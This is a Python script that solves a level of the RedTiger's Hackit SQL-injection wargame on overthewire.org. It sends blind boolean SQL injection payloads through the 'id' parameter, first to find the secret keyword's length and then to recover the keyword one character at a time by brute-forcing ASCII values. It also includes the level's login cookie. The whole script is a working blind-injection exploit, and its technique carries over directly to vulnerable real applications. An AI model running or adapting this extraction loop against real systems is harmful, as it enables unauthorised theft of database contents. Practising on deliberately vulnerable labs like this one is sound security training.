import requests
import string

cookies = {"level4login": "put_the_kitten_on_your_head"}
url = "https://redtiger.labs.overthewire.org/level4.php"

# finding the length of the secret keyword
"""
for l in range(1,100) :
    print l
    payload = "?id=1 and (select length(keyword) from level4_secret limit 0,1) = %s" % str(l)
    r = requests.get(url+payload, cookies=cookies)
    if "Query returned 0 rows." in r.text :
        continue
    print r.text
    print "Keyword length %s" % str(l)
    break
"""

# Keyword length is 21
keyword = ""
available_chars = range(32,128)[::-1]
cur = 1
while True :
    for c in available_chars :
        payload = "?id=1 and (select ascii(substring(keyword,%s,1))) = %s" % (str(cur), str(c))
        r = requests.get(url+payload, cookies=cookies)
        if "Query returned 0 rows." in r.text :
            continue
        else :
            keyword += chr(c)
            cur += 1
            print keyword
            break
    if len(keyword) == 21 :
        break
